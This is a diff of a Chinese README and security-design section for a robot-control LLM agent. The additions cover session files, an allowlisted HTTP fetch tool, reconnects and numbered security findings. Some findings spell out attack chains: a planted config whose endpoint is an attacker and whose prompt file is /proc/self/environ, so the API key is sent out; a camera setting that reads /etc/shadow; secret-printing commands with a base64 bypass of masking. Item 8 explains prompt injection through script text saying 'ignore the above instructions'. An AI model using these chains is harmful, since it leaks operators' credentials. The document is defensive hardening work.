+     文档，这里补上。理由：兼容指纹要么放过「工具集变了、可历史里还留着对已删工具的
+     调用」这种服务端会 400 的序列（正是判据 3 要挡的东西），要么得逐条改写历史——
+     两条都比让操作者重开一段会话贵得多。
+
+     ② **改工具的描述文本不影响 `--resume`**（名字没变）。措辞校准可以放心做，不会断掉
+     操作者的既有会话。
+
+     ③ 这个公式**不能改**：C++ 侧的会话文件原语已随批次 D 清退（`d16b39f`），但行格式
+     与指纹公式刻意保持逐字节兼容，好让 C++ 时代落下的会话文件仍能被现在的进程读回
+     （见 `agent/src/session.rs:3-5` 模块头）。`session.rs` 里那些「与 C++ `xxx` 同式」
+     的注释指的是这份**已删除的**参考实现，是兼容约束而非现存孪生。
+
   3. **协议自洽**：`tool_call_id` 无孤儿、无重复、无漏答（Rust 侧
      `session::protocol_violation`，与 C++ 参考的 `historyProtocolViolation`
      同判据同文案）——恢复的历史是磁盘上的可变内容，按**不可信输入**对待，
@@ -599,7 +732,101 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
   --session-file /var/lib/mybot/s.jsonl --resume
 ```
 
-（远程对话已评估不做，决策存档见 [design/decisions.md](design/decisions.md)）
+### 缺省落点与自动续接（`$MYBOT_HOME`，2026-10-03）
+
+不给 `--session-file` 时，对话历史**缺省就落盘**，按机器人归档并缺省续接上一次：
+
+- **状态目录**：环境变量 `MYBOT_HOME` > `$HOME/.mybot`。首次运行自动逐级建目录（`0700`）。
+  启动时把**实际落点**打印到 stderr（`会话落点: <路径>（新建 | 续接上一次；状态目录来源 …）`）。
+- **布局**：`$MYBOT_HOME/robots/<机器人>/sessions/<UTC 时间戳>.jsonl`，另有 `sessions/latest`
+  指针文件（`0600`）记「当前段」。`<机器人>` 取自结构脚本展示名，经安全归一（不安全字符
+  折叠、数字开头补 `_`、超长截断，仅改写时追加指纹短哈希）。段文件以 `O_EXCL` 原子创建，
+  同名冲突自动加 `-<pid>`／序号后缀。
+- **缺省续接**：交互 REPL 与 `--task` 都**默认续接**该机器人最近一段（等价于把 `--resume`
+  自动指向 `sessions/latest`）。要每次新开一段用 **`--new-session`**；它与 `--resume` 互斥，
+  同给退出 2。
+- **续接失败不中止**：缺省路径下，段头损坏 / 指纹不符 / 协议不自洽时**告警一次并自动新开
+  一段**，旧段原样保留、进程退 0（现场重启不该被一份坏文件挡住）。显式 `--resume` 仍按上面
+  「三道判据」报错退出 2——显式要求恢复却恢复不了，必须响亮失败。
+- 显式 `--session-file <路径>` 的语义完全不变：本机制只作用于「不给路径」的缺省情形，
+  且缺省布局没有显式路径的「已恢复/退出 2」概念（降级即新开段）。
+
+```bash
+# 缺省：跑完落 $MYBOT_HOME/robots/<机器人>/sessions/<时间戳>.jsonl，下次同机器人自动续接
+./agent/target/release/mybot-agent --socket /tmp/mybot.sock --task "看看硬件"
+
+# 想每次都从干净上下文开始
+./agent/target/release/mybot-agent --socket /tmp/mybot.sock --new-session --task "看看硬件"
+
+# 换状态目录（对话历史与 sim 地图都跟着走）
+MYBOT_HOME=/var/lib/mybot ./agent/target/release/mybot-agent --socket /tmp/mybot.sock
+```
+
+## 远程对话（已评估，不做）
+
+> **决策（2026-09-25）**：agent over TCP 远程 REPL **不做**——随 C++ agent 移除后
+> 它曾规划由 Rust agent 承担（原批次 E），本次经维护者评估正式关闭，设计存档下架
+> （历史全文见本决策提交之前的 git 历史）。远程场景回归既有路径：ssh 到机器人侧
+> 本地运行 `mybot-agent`（stdin 交互）；动作脚本的远程投递走 `--tcp` 动作源
+> （安全口径不变：回环缺省、跨机必须 `--tcp-token`）。批次字母 E 作废，不再复用。
+
+决策存档（main 侧沿革记录）另见 [design/decisions.md](design/decisions.md)。
+
+## 出站 HTTP：http_fetch
+
+`http_fetch` 让模型对**操作者列出的少数几个受控主机**（内部 API、文档站点）发一次
+HTTP GET。它是 **Rust 本地工具**：在 `mybot-agent` 进程里执行（`agent/src/httpfetch.rs`），
+不经 C++ 后端——后端承诺零第三方 C++ 依赖，不引 HTTP 客户端；Rust 侧复用 rig 已带的
+`reqwest`（钉同一版本、只开 `rustls`，不新增下载、不引入 openssl）。
+
+```bash
+# 只放行两个内部服务；不写端口 = 只放行 http/https 缺省端口
+mybot-agent --socket /tmp/mybot/mcp.sock \
+  --allow-host docs.internal.example --allow-host 10.0.0.5:8080 \
+  --http-fetch-timeout 10 --http-fetch-max-bytes 65536 --task "查一下传感器手册里的量程"
+```
+
+`mybot-agent` 的三个选项（Rust 选项不进上面那张后端选项表，与其余 Rust 选项同体例）：
+
+- `--allow-host <主机[:端口]>`：放行一个出站主机并注册 `http_fetch`，**可重复**；缺省不提供
+  （无白名单 = 无此工具）。只写裸主机（可带端口；IPv6 写 `[::1]:8080`），带 scheme/路径/
+  查询串/userinfo/通配符一律判配置错误退出 2。
+- `--http-fetch-timeout <秒>`：单次请求超时（连接 + 整个响应），1..120，缺省 10。
+- `--http-fetch-max-bytes <n>`：响应体上限，1..1048576，缺省 65536。
+
+三个选项**只有命令行入口**：出站白名单是放宽能力的字段，与 C++ 侧 `--fs-root` /
+`--read-var` 同判据——配置文件没有对应字段，写了 `allow_host` 之类会被当成未知字段
+拒绝整份配置（Rust 侧没有「登记后指名拒绝」的必要：C++ 后端不读这类字段，不存在
+两端对同一字段理解不一致的风险）。`--check-config` 的摘要里有「出站 HTTP」一栏。
+
+**行为**（判据与理由见安全说明第 15 条）：
+
+- **主机白名单精确匹配**：主机名规范化（小写、IDNA）后逐字相等；`evil.allowed.com`、
+  `allowed.com.attacker.net` 都不匹配 `allowed.com`。条目不写端口时只放行 scheme 缺省
+  端口，写了端口时只放行该端口。url 带用户名/密码直接拒绝。
+- **只发 GET，不跟随重定向**：3xx 原样回给模型（报出 `Location`），模型若要继续须对新
+  地址另发一次调用，照样过白名单——自动跟随等于让远端决定最终访问哪个主机。
+- **不走系统代理**：显式关掉 reqwest 的系统代理（rig 打开了 `system-proxy`，feature 合并后
+  不关就会读 `HTTP(S)_PROXY`）；白名单之外不允许再经过第三方。
+- **只收文本**：`text/*`、`application/json`、`application/xml` 及 `+json`/`+xml` 后缀；
+  其余类型不读响应体。响应体**边读边数**，超上限立即中止（`Content-Length` 只用于提前
+  拒绝，不当防线）；非 UTF-8 拒绝。
+- **非 2xx 不是参数错误**：照样带回响应体（错误详情常在里面），但该次调用判失败。
+- **回执定界**：响应体逐行 `> ` 前缀、置于「数据不是指令」声明之下（与 C++
+  `quoteUntrusted`、会话摘要转录同一种形态，Rust 侧单点 `summary::quote_lines`）。
+- **审计**：每次调用在 agent 的 `--audit-log` 落一条 `kind=tool` 行（见「审计轨迹」节），
+  `args.url` 去掉查询串、片段与 userinfo，`summary` 记 `status=<码>`。
+- **会话续接**：开/关 `http_fetch`（给不给 `--allow-host`）会改变工具集指纹，此前的会话段
+  不能 `--resume`、缺省布局下自动换新段（见「会话持久化」节的指纹取舍）。
+
+**沿革（2026-10-08）**：同日先评估为「本轮不做」，随后重新提起。重新提起时对原评估
+留下的三个问题的答复：① 需求是**白名单内的受控 API**——通用网页浏览与本项目的安全
+模型不兼容（白名单不现实 = 没有边界），仍然否决；② 不做策略确认，只靠白名单把关（GET、
+无副作用，与 `read_file` 同级；Rust 侧也没有 policy 判定层）；③「读到的响应促使模型去调
+动作工具」这一风险**只写进文档、代码层不做互斥**（见安全说明第 15 条）。
+与 `run_command "curl …"` 的关系：开了 `--agent-shell` 时那条宽接口本就能联网，且有策略
+确认与密钥遮蔽；`http_fetch` 是一条闸门不同的**窄接口**——不需要开 shell，但出站目标被
+白名单锁死、只能 GET、不跟随重定向。两者的取舍由操作者按部署选择。
 
 ## 策略钩子：--agent-policy
 
@@ -614,6 +841,10 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
   "on_timeout": "deny"
 }
 ```
+
+仓库根的 [mybot.policy.json.example](../mybot.policy.json.example) 是可直接复制的起点模板：
+`require_confirm` 已列全三件危险工具（多列无副作用——工具未开启时根本不存在），
+`confirm_command` 是占位符，未换成本机确认程序前，命中确认的调用一律放不出去（fail-closed）。
 
 - **确认协议**：命中 `require_confirm` 的工具在**执行之前**，宿主把
   `{"tool": "<工具名>", "args": {…}}` 写给确认程序的 stdin，按其**退出码**裁决——`0` = 放行，
@@ -653,8 +884,8 @@ agent 就是 `mybot-agent`。
 ```
 [mybot-agent]（Rust，模型循环） ──帧/AF_UNIX──> [mybot --mcp-backend] ──> 硬件
    │  直连 provider（reqwest）
-   └─ 审计：kind=model / kind=session 行（agent 侧落）
-      后端落 kind=tool 行（可共用同一个 --audit-log）
+   └─ 审计：kind=model / kind=session 行（agent 侧落）；本地工具 http_fetch 的
+      kind=tool 行也由 agent 侧落。后端工具的 kind=tool 行由后端落（可共用同一个 --audit-log）
 ```
 
 后端只认一条 pymsg 兼容的帧协议（`[4 字节 BE 长度][UTF-8 JSON]`，上限 8 MiB——
@@ -699,6 +930,10 @@ agent 就是 `mybot-agent`。
 - **强制外部确认（折中）**：后端开 `--agent-shell`（run_command）或 `--agent-hot-sql`（apply_sql）时，
   **强制**要 `--agent-policy`，且其 `require_confirm` 必须分别包含 `run_command` / `apply_sql`，
   否则 `buildAgentConfig` 拒绝启动（配置错误不碰真机）。纯只读 / 查询 / 动作脚本后端不受此约束。
+- **agent 侧断连重连（2026-09-30，审计 P1）**：传输失败（I/O/读超时/超限）后 agent 把连接
+  判死，**下一次调用**前透明重连（connect 退避 30s + 按需重走首帧认证，`bridge::Conn`）——
+  后端中途重启不再要求 agent 跟着重启。**在途调用绝不重试**：回执丢失的 `tool.call` 可能已在
+  后端执行，重发即重复物理动作；判死的那次调用如实报错给模型，lock-step 物理安全语义不变。
 - **每连接预算再强制**：后端不假设调用方是 agent loop，故自行再强制一层跑飞护栏——
   `--mcp-call-budget <N>` / `--mcp-wall-clock <秒>`（0/空 = 不限）。超限的调用**在派发前**被拒
   （无副作用）。注意**单次**物理调用的 `scriptTimeoutSec`/`commandTimeoutSec` 始终在工具层生效，
@@ -708,9 +943,12 @@ agent 就是 `mybot-agent`。
   （到点断连，对端可重连）。缺省不限是刻意的：REPL 两次工具调用之间（人在思考、模型长推理）
   可能空闲很久。另：启动时若 socket 路径上已有**活着的**后端实例（探测 connect 成功即判定），
   本进程会响亮拒绝启动而不是抢走 socket 文件（防双实例静默劫持）。
-- **断连安全动作**（2026-09-25，`--on-disconnect <脚本>`）：连接结束——对端正常关闭、agent 进程崩溃/
-  被杀、空闲或墙钟超时、协议违规、回帧发送失败，**任何原因**——后端随即自行执行操作者预设的动作
-  脚本（`--scripts-dir` 之下的相对路径，如 `zero.mt`），把硬件带到安全姿态。缺省不执行：此时硬件停在
+- **断连安全动作**（2026-09-25，`--on-disconnect <脚本>`）：**被服务连接**结束——对端正常关闭、
+  agent 进程崩溃/被杀、空闲或墙钟超时、协议违规、回帧发送失败，任何原因——后端随即自行执行操作者
+  预设的动作脚本（`--scripts-dir` 之下的相对路径，如 `zero.mt`），把硬件带到安全姿态。**未通过认证的
+  连接不触发**（2026-10-01 审计收口：设了 `BOT4CJ_MCP_TOKEN` 时，探连「连上就断/认证帧未到」与认证
+  失败从未进入业务循环，不执行动作、后端日志点名跳过——否则同 UID 对端反复 connect+close 可反复
+  驱动执行器，连败 5 次还会借停机断电链把后端打停）。缺省不执行：此时硬件停在
   **最后一个姿态**带电常驻，直到操作者干预。设计要点：
   - 脚本在**上电前预检**（`buildAgentConfig` 第 11c 步，判据与 `run_action_script` 同源：越界 / 不存在 /
     为空即退出 2）——脚本名拼错不该等到第一次断连、也就是最需要它的那一刻才发现；
@@ -752,14 +990,249 @@ listening fd 是 CLOEXEC
 进程的内存：名字含 `token`，被 `run_command` 的环境清洗自动剔除；宿主与 agent 各自
 `prctl(PR_SET_DUMPABLE, 0)` 后 `/proc/<pid>/environ` 对同 uid 不可读。**版本配对**：不支持
 auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提示两侧须同升/同不设），带
-密钥的新后端对不先认证的旧 agent 同样拒绝。回归：`test_mcpbackend` 三态单测、`mcp_e2e.sh`
-M6（正确/错误/无认证帧/空密钥拒启）、`agent_e2e.sh` R17（两进程正反两面）。
+密钥的新后端对不先认证的旧 agent 同样拒绝。**连续失败门（2026-09-30，审计 P1）**：首帧认证
+连续 5 次失败后端即停止服务（`AuthFailGate`，与 TCP 口令的 `authMaxFails=5` 同口径；哑对端
+「连上不发帧」不动计数、认证通过才归零——试探者无法用「连了就断」刷新失败窗口）。到顶走正常
+停机断电链（fail-closed），操作者重启后端恢复、必要时更换密钥。回归：`test_mcptransport` 的
+`mcpbackend_auth_fail_gate_counts_consecutive_rejections`。其余回归：`test_mcpbackend` 三态单测、
+`mcp_e2e.sh` M6（正确/错误/无认证帧/空密钥拒启）、`agent_e2e.sh` R17（两进程正反两面）。
 
 ## 安全说明（请务必读）
+
+1. **`run_command` 是无命令白名单的任意 shell 执行，但后端强制要求 policy 确认**。
+   它缺省不注册，只能由后端命令行 `--agent-shell` 授权；配置文件不能自行开启。
+   同时必须提供 `--agent-policy`（或后端配置的 `agent_policy`），且 `require_confirm`
+   包含 `run_command`；`--agent-hot-sql` 同理必须覆盖 `apply_sql`，否则上电前拒绝启动。
+   模型仍可能被外部输入诱导执行任意命令；确认程序须可信，超时缺省拒绝（可显式改为放行）。
+   policy 不是隔离边界：需要对外暴露时仍须专用用户 / 容器 / 网络命名空间。
+2. **后端保留两道环境防线**（2026-09-20 审计 A 收口）：
+   ① `run_command` 的子进程环境按**整词**清洗——名称含 `key` / `token` / `secret` / `password` /
+   `passwd` / `credential` 的变量不传给子进程（`BOT4CJ_LLM_KEY` 天然落在内，`KEYSTONE`/`MONKEY` 不误伤）；
+   ② C++ 后端抹掉自己 exec 时环境块中的敏感串；旧 C++ agent 曾先注入模型密钥再抹零。
+   **这些防线不覆盖独立 Rust 进程的环境**——Rust 进程的内存与 `/proc/<pid>/environ` 由第 3 条的
+   `PR_SET_DUMPABLE=0` 挡住同 uid 读取，但仍不能推断同 uid 的 shell 拿不到密钥（落盘来源见下）。
+   **落盘来源仍是明文可读**：密钥若来自配置文件（`api_key` 字段）或密钥文件（`api_key_file`），
+   同用户 shell 可直接读出，`chmod 600` 对此无效。后端不解析模型密钥来源，不能再依赖旧
+   C++ agent 的「启用 shell 且密钥来自文件」启动告警。
+   **③ 回执的第三道防线（2026-09-23 审计 G1）**：子进程环境清洗挡不住「命令自己把密钥打印到
+   stdout/stderr」——模型让命令执行 `env`、`cat` 配置文件、或任何打印 `KEY=value` 的输出，都会经
+   回执带回模型上下文，再由同一配置可控的 `endpoint` 外发。因此 `run_command` 的**回执文本**在回传
+   模型**之前**也会过一次敏感值遮蔽（与审计日志的 `args.command` 是同一个 `maskSecretsInText` 单点：
+   `KEY=VALUE` / `Authorization: Bearer <tok>` / 裸 `Bearer <tok>` / JSON 引号键 `"name": value` 四种形态）。
+   最后一种是 2026-10-08 审计 P1 续发现并补上的：本仓真实密钥的落盘形态（`mybot.llm.json`、会话 JSONL）
+   恰恰是带引号的键名，旧的三种形态判据在遇到键名前导的 `"` 时根本进不了识别分支——意味着 `cat
+   mybot.llm.json` 这个最直觉的读密钥命令，从 2026-09-23 G1 落地起就从未被真正遮蔽过，只是没人拿
+   真实 JSON 内容去测过。遮蔽是**有损**的：
+   一旦发生替换，回执末尾会追加一句「已净化」提示，让模型知道结果被改过、不要据此假定原值。
+   注意这仍是**文本级**防线（把值 base64/编码后打印即可绕过），与上面两道同档——真要对抗恶意 shell，
+   仍须把 agent 放进专用用户 / 容器（见本节第 3 条末）。
+
+3. **模型 API key 由 Rust 直接读取**：`agent/src/config/`（环境变量链在 `mod.rs`，
+   文件内联与 `api_key`/`api_key_file` 在 `file.rs`）取密钥，`provider.rs` 用于请求头；不经后端工具参数、Lua 驱动或
+   `BOT4CJ_DEBUG` 转储，两端均无命令行传密钥的入口。
+   - 环境变量链：`BOT4CJ_LLM_KEY` → `ROBOT_AGENT_API_KEY` → `DEEPSEEK_API_KEY`，再回退到 Rust 配置文件的 `api_key` / `api_key_file`。
+   - **两进程都不可 dump**（2026-09-25）：`mybot` 与 `mybot-agent` 进入 `main` 的第一件事是
+     `prctl(PR_SET_DUMPABLE, 0)`——在解析 argv、读配置之前。效果：同 UID 的其他进程不能
+     `ptrace` 附着（gdb/strace attach 得到 EPERM），`/proc/<pid>/environ`、`mem`、`maps` 等
+     变为 root 属主不可读，崩溃不落 core。边界如实：**root / `CAP_SYS_PTRACE` 不受影响**，
+     `/proc/<pid>/cmdline` 仍全机可读（所以 `--tcp-token` 仍推荐走环境变量），密钥的**落盘
+     来源**（配置文件 / 密钥文件）与本步无关。调试需要 attach 时设 `BOT4CJ_ALLOW_PTRACE=1`
+     （两进程各打一行「注意」）；sanitizer 构建编译期跳过（LeakSanitizer 需 ptrace 自身）。
+   - **同 UID 仍不构成隔离**：上面这一步挡的是「读运行中进程的内存」这一条路；同 UID 的 shell
+     仍能读密钥文件、改配置、替换驱动 `.lua`、以相同环境重新拉起 agent。想同时挡住其他本机用户
+     与 agent 自己的 shell，得把 agent 放进**专用用户 / 容器 / 网络命名空间**。
+   - 落盘的密钥请 `chmod 600`，启动时对「同组/其他用户可读」会打印提醒，仓库 `.gitignore` 已挡住 `mybot.llm.json` 一类文件名
+   - 曾有的 `--llm-key` 已移除：它必然出现在 `/proc/<pid>/cmdline`（本机所有用户可读）
+4. **动作脚本路径是沙箱边界**：`run_action_script` 只接受 `--scripts-dir` 下的 `.mt` 相对路径。这是防误用护栏，
+   不是对抗恶意模型的边界——真正的边界仍然是「模型输出即不可信输入」这条工程常识。
+5. **仪表器件不会被工具误触发**：`list_hardware` 不读值（对舵机等执行器，`play({})` 会真的下发指令）。
+   `capture_image` 同样有种类防线：`camera_var` 必须解析到一个 **Lua 驱动**，否则该工具直接不注册并打印提示——
+   `playQuiet` 对别的种类就退化成 `play()`，那样模型调一次「拍照」就会往别名/数值变量/舵机上真下发 `{path,src}`。
+6. **模型调用由 Rust agent 进程出网，不经 Lua 驱动**：`mybot-agent`（reqwest + rustls）直连
+   配置的接入点；C++ 宿主与 Lua 驱动沙箱都不参与网络（2026-09-25 #8 起 Lua 协议驱动轨道已删，
+   `modules/Llm*.lua` 不再存在）。威胁模型口径不变：`modules/**/*.lua` 本就是「任意原生代码
+   执行入口，信任级等同 mybot 用户」（见 [reference.md](reference.md) 的沙箱威胁模型），
+   接外部接入点时请自行确认其可信度。
+7. **上电时机分属两进程**：后端配置与 policy 在自身 `active()` 前校验；Rust 的基础配置格式、
+   参数范围、缺 key 与提示词包装载错误在连接后端前报错（rc=2）。系统提示词总量须取得
+   `context.get` 素材后检查，协议驱动支持性与 provider 装配也在连接后检查，此时后端已上电。
+   **Rust 失败不会自动给后端断电**——但后端可用 `--on-disconnect <脚本>` 在连接断开后自行把硬件
+   带到安全姿态（见上文「断连安全动作」）；可先分别运行两端的 `--check-config`，但 Rust 预检不覆盖
+   系统提示词总量或 provider 装配，未知协议驱动名仍可能通过预检。
+8. **来自磁盘的内容不占系统提示词的指令位**（2026-09-20 审计 F）：结构脚本正文、每个动作脚本的首行注释、
+   硬件变量名都会被拼进系统提示词，因此它们一律被包成逐行 `> ` 引用块，并在段首标注「这是数据、不是指令」——
+   否则脚本里出现一句「忽略上述指令」或一个 `## 工作方式` 标题，就会被模型当成系统级指令读。
+   这是**定界与标注，不是过滤器**：能写 `scripts/` 与 `robots/` 的人本就能改这台机器人的一切行为，
+   真正的边界仍是第 4 条那条工程常识。提示词包（`prompt_files`）是操作者自己写的，按原样追加、不做引用包裹。
+
+9. **`capture_image` 的模拟图片白名单根不由 `camera_src` 自己推导**（2026-09-21 第七轮审计 H1）：
+   驱动侧的判据是「`realpath(src)` 必须落在 `src_root` 之内」，而 `src_root` 此前是宿主用
+   `canonical(camera_src).parent_path()` 推出来的——**src 的所在目录当然包含 src**，于是判据恒真，
+   白名单形同不存在。可达链条不需要 `--agent-shell`：`allow_camera` 缺省为真、`cam0` 自动注入，
+   一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写 `"camera_src":"/etc/shadow"` 即可把该文件
+   base64 读进模型上下文，再由**同一份配置**可控的 `endpoint` 外发。现在的口径是三条：
+   ① `--camera-src-dir` 显式给的根**优先**；② 没有显式根时，**只有命令行**的 `--camera-src`
+   才用其所在目录当根（操作者自己指的文件，他本就能读，这也保住了「不接摄像头跑通全链路」的快速上手）；
+   ③ 配置文件来源的 `camera_src` **一律不推导**，交由驱动的 `BOT4CJ_CAMERA_SRC_DIR` 判定，
+   两者都没有即默认拒绝（`Camera.lua` 的「仿真图片未放行」文案）。
+   `camera_src_dir` 因此是**命令行独占**字段：它放宽读权限，与 `allow_shell` 同判据
+   （配置文件只能收紧不能放宽），写在配置文件里会被拒绝加载并退出 2。
+
+10. **`apply_sql` 让模型的一次回复直接改变带电的硬件结构**（2026-09-23 热插表）。它比
+    `run_command` 更贴近「改这台机器人本身」：新表即 `modules/<表名>.lua` 驱动（表名决定模块
+    解析路径），新变量即真机开 fd 供电。因此它与 `run_command` 走同一条门控链——**缺省不注册，
+    只能用命令行 `--agent-hot-sql` 开启**，配置文件写 `allow_hot_sql: true` 会被拒绝加载
+    （理由同第 1 条：缺省查找会读 CWD 的 `./mybot.llm.json`）。
+    热插路径另有三道自有判据（不依赖操作者自律）：表名与列名必须通过安全标识符校验（挡
+    `../` 目录穿越与 `@Daemon` 配置串注入）、驱动模块必须已存在于模块路径下、守护行的 `chunk`
+    必须是模块路径下的相对路径。这些校验**全部只读**，通过后才提交；提交中任一步失败即整批
+    回滚（逆序断电 + 注册表回退到批次前的水位），不让系统停在「一半器件已上电」的半成品状态。
+    只读的 `query_sql` 不受这条门控影响。
+
+    同一门控下还有**热删除**（`DELETE FROM ... [WHERE ...]`）与**整表撤下**（`DROP TABLE ...`，
+    均 2026-09-23），但危险性质不同：
+    热插/INSERT 是可回滚的加法，而 `DELETE` 走 `destroy()` —— **物理断电，没有回滚**
+    （回滚 ≠ 复活器件）。因此它的防线不靠「事后撤销」而靠「**事前判全**」：
+    - 全部校验（目标表存在、行能命中、**引用完整性**、全结构判据）都在**动第一个器件之前**
+      跑完，任一失败即整批拒绝、活体一字未动；过了这道关，剩下的失败只可能来自物理
+      `destroy` 本身。
+    - 引用完整性是新增的关键判据：被别的行以 `controller`/`trigger`（含 `controller2` 这类
+      编号列）、`$name` 或 `$(...)` 表达式引用着的变量**拒绝删除**并点名引用方。理由不是保守，
+      而是这些引用在框架内部是**终身缓存的裸指针**（`MtVars_Lua::ctrlPtrs_`/`trigPtrs_`
+      首用缓存、`MetaRef::target` 在装配期锁定），删掉被引用者即悬垂指针——静默 UB 换不来
+      任何好处。判据看的是**删除之后**的视图，故「引用方一起删」是允许的。
+    - 物理 `destroy` 中途失败时**立即中止**后续删除并如实报出「已删 N 个（名单）、M 个未删」，
+      结构与注册表只反映已成功摘除的部分——不假装回滚，也不继续硬闯叠加失败。
+    - 条件命不中任何行时**报错**而不是静默成功：模型/操作者拿到「已生效」却什么都没发生时，
+      无从判断是条件写错还是器件本就不在（拼错 name 的 DELETE 会让人以为器件已摘除）。
+    - 删除后 `flowRefs_` 里的名字一并摘除，故「删掉再热插同名变量」是一条合法恢复路径。
+
+11. **配置文件里的 `prompt_files` 不是「读任意文件」的原语**（H2，2026-09-23 第八轮审计）。
+    提示词包的内容会进系统提示词、随**首个**模型请求发往 endpoint，而 endpoint 同样由
+    配置文件决定；读取又走 `read()` 循环（`util::readFileCapped`，不依赖 `stat` 长度），
+    因此 **`/proc/self/environ` 这类伪文件照样读得到**。合起来是一条不需要任何开关的链路：
+    一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写
+    `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}`，就能把操作者的环境块
+    （其中就有宿主重新注入的 `BOT4CJ_LLM_KEY`）整块外发——不需要 `--agent-shell`，也不
+    需要摄像头。这与第 9 条的 `camera_src` 是**同一族**（「配置文件不该授予读权限」），
+    故同判据：
+    ① **命令行** `--prompt-file` 不受限（操作者自己指的文件，他本就能读，也保住了
+    `--prompt-file prompts/spider_robot/` 的快速上手路径）；② **配置文件来源**的每一项
+    必须落在当前工作目录，或 `BOT4CJ_PROMPT_DIR`（冒号分隔）显式列出的目录之内，判定走
+    `realpath`（`..` 与软链逃逸都拦），越界即在上电前报错退出 2 并点名条目、允许的根与
+    两个出路；③ 环境变量只能由启动者设置，配置文件写不了它——与第 9 条的
+    `BOT4CJ_CAMERA_SRC_DIR` 是同一个逃生口。
+    残余如实声明：这条判据管的是**路径来源**，不是内容——CWD 之内的文件（包括攻击者自己
+    放进去的）仍会被原样追加进系统提示词，这属第 8 条已声明的「提示词包按操作者写的原样
+    追加」；真正的边界仍是「不要在不信任的目录里启动 mybot」。
+
+12. **`read_variables` 的可读集合只能由操作者显式列名**（2026-09-23 回读通道）。工具本身
+    是只读的（走 `playQuiet`，对 `daemon` 只是读已发布的采样快照，无 I2C 流量），但
+    **「能读哪些变量」无法靠种类自动判定**：`Servo.lua` / `Relay.lua` 与传感器同属
+    `kind=lua`，对它们调 `play()` 会**真驱动硬件**（`Relay` 的 `call({})` 会把 delay 转发给
+    controller）。因此口径是：
+    ① 可读集合由命令行 `--read-var <名>`（可重复）声明，**缺省不提供该工具**；
+    ② 配置文件写 `read_vars` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
+    `allow_shell` / `camera_src_dir` 同判据，理由同第 1 条：缺省查找会读 CWD 的
+    `./mybot.llm.json`）；
+    ③ 声明里已注册且种类为 `lua`/`daemon` 的名字才生效，其余**跳过并点名**（启动时打一行
+    `提示: …被跳过…`）——不因一个拼错的名字让整条能力静默失效，也绝不放行"种类不对"的
+    变量（`playQuiet` 对别的种类退化成 `play()`，与第 5 条 `capture_image` 的种类防线同一
+    理由）；一个都不可读时该工具不注册。
+    边界如实声明：**读传感器也可能有副作用**——部分器件的 `call` 会先写触发寄存器再读，
+    所以这是一次**派发**（照走任务预算与审计），不是"绝对不改状态"的承诺。
 
 危险能力（`run_command` 任意 shell、`apply_sql` 带电变更、可读变量清单）**缺省全关**，须由后端命令行 `--agent-shell` / `--agent-hot-sql` / `--read-var` 显式开启，且必须配合 `--agent-policy` 确认程序。密钥只走环境变量或配置文件，不经 argv。配置错误（含未知字段、区间越界、权限放宽）一律退出 2，不碰真机。
 
 完整安全设计论证（含攻击场景、防线推导与历史审计记录）见 [design/security-rationale.md](design/security-rationale.md)。
+
+13. **`list_dir` / `read_file` 的只读根目录只能由操作者显式指定**（Phase 4，2026-10-07）。
+    这两个工具让模型访问机器人主机上的**普通文件系统**（与硬件/shell 无关），故与
+    `read_variables`（第 12 条）同一族判据：
+    ① 只读根目录由命令行 `--fs-root <目录>` 声明，**缺省不提供这两个工具**；
+    ② 配置文件写 `fs_root` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
+    `allow_shell` / `camera_src_dir` / `read_vars` 同判据，理由同第 1 条）；
+    ③ 根目录在上电前预检（必须 `canonical` 存在且是目录，判据与 `--on-disconnect`
+    同口径），拼错目录名在配置期就失败，不必等到模型第一次调 `list_dir` 才发现。
+    路径沙箱是独立于 `resolveActionScriptPath`（动作脚本的词法校验）与
+    `capture_image` 白名单（Lua 侧 `realpath` + 前缀比较）的**第三套实现**
+    （`agent_sandbox.hpp` 的 `resolveUnderRoot`）：词法层拒绝绝对路径/`..`/空段/NUL，
+    语义层沿路径回退到**已存在的最长前缀**做 `canonical` 包含性判定——即使目标文件本身
+    尚不存在（`read_file` 读一个刚创建的路径），其已存在的祖先目录若是指向根外的符号链接
+    仍会被拦下，不必等到 `open()`。`read_file` 另在 `O_NOFOLLOW` 读取层拒绝目标文件本身是
+    符号链接的情形（两层防线职责不同、缺一不可，见该头文件头注）；只读文本，二进制内容
+    （含 NUL 或非法 UTF-8）一律拒绝返回，不 base64 静默塞进上下文。`list_dir` 的目录条目
+    里软链同样不列出（与 `list_action_scripts` 对脚本目录软链的既有判据一致）。
+    与 `run_command`（第 1 条）的关系：对一个已经开了 `--agent-shell` 的部署，这两个工具
+    并不额外扩大能力上限（`run_command` 本就能读文件），但它们是结构化、单文件、可审计的
+    窄接口，适合"只是想看某个文件"这个具体动作，而不必派发一条任意 shell 命令。
+    **密钥遮蔽**（2026-10-08 审计 P1 补）：`read_file` 的文件内容在"数据非指令"定界前另过
+    `maskSecretsInText`——与 `run_command` 回执同一单点（第 1 条）。动机：`--fs-root .`
+    （最自然的写法）会让仓库根的 `mybot.llm.json` 可读，`--fs-root ~` 会让 `~/.mybot` 下的
+    会话历史、`~/.config/mybot` 的模型配置可读，这些文件里的 `api_key` 不能因为走了"更窄"
+    的工具反而比 `run_command` 更容易泄漏。**使用约束**：即便有遮蔽兜底，`--fs-root` 也
+    **不应**指向含密钥/会话文件的目录（遮蔽是防线、不是许可证——文本级判据存在被编码绕过
+    的理论可能，参见第 1 条③末的同款免责声明）。
+
+14. **`write_file` 的写权限是独立开关，且后端下强制策略确认**（Phase 5，2026-10-08）。
+    第 13 条的两个工具是**只读**的，`write_file` 不是——它能创建和**覆盖**主机文件，是
+    与 `run_command`（第 1 条）/ `apply_sql`（第 10 条）同级的危险能力，故比第 13 条多两道
+    约束：
+    ① **独立开关**：写权限由命令行 `--agent-write-file` 单独授予，**不随 `--fs-root` 静默
+    获得**——"能读哪个目录"与"能往哪个目录写"是两件事，开了读根不等于给了写权。它复用
+    同一个根（`--fs-root`）：写权限天然应 ⊆ 读权限（你总得先看清往哪写），两个独立根会
+    制造"读根与写根不一致时权限到底算谁的"这种无意义的交叉态；只给 `--agent-write-file`
